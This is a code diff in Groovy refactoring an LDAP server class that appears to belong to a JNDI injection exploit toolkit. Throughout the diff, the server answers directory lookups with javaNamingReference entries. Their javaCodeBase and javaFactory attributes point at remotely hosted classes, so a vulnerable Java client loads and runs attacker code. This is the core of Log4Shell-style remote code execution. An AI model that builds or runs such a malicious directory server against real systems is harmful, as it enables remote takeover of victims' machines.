@@ -1,8 +1,6 @@
 package com.jndi.server
 
-import com.jndi.utils.JndiMapping
 import com.jndi.controller.JndiController
-import com.jndi.entity.Jndi
 import com.jndi.server.impl.JNDIServer
 import com.unboundid.ldap.listener.InMemoryDirectoryServer
 import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig
@@ -33,7 +31,7 @@ class LDAPServer extends InMemoryOperationInterceptor implements JNDIServer {
     String base
 
     @Autowired
-    JndiController jndiController
+    SimpleJNDIServer jndiServer
 
     @Override
     void run(String... args) throws Exception {
@@ -54,30 +52,26 @@ class LDAPServer extends InMemoryOperationInterceptor implements JNDIServer {
     @Override
     void processSearchResult(InMemoryInterceptedSearchResult result){
         def base = result.getRequest().getBaseDN()
-        def index = base.indexOf('#')
+        def bi = base.indexOf('#')
         def path
-        if (index != -1){
-            path = base.substring(0, index)
+        if (bi != -1){
+            path = base.substring(0, bi)
         } else {
             path = base
         }
         def e = new Entry(base)
-        def method = jndiController.getClass().getDeclaredMethod(path)
-        def jndi
-        if(method && method.isAnnotationPresent(JndiMapping.class)){
-            jndi = method.invoke(jndiController, null) as Jndi
-        } else {
-            jndi = jndiController.hello()
+        def method
+        try{
+            method = JndiController.class.getDeclaredMethod(path)
+        } catch (ex){
         }
-        def factoryLocation = jndi.factoryLocation
-        def factory = jndi.factory
+        def jndi = jndiServer.generateClass(method)
         e.addAttribute('javaClassName', jndi.className)
-        e.addAttribute('javaCodeBase', factoryLocation)
+        e.addAttribute('javaCodeBase', jndi.factoryLocation)
         e.addAttribute('objectClass', 'javaNamingReference')
-        e.addAttribute('javaFactory', factory)
+        e.addAttribute('javaFactory', jndi.factory)
         result.sendSearchEntry(e)
         result.setResult(new LDAPResult(0, ResultCode.SUCCESS))
-        log.info("LDAP ${base} ${factoryLocation}${factory}")
     }
 
 }
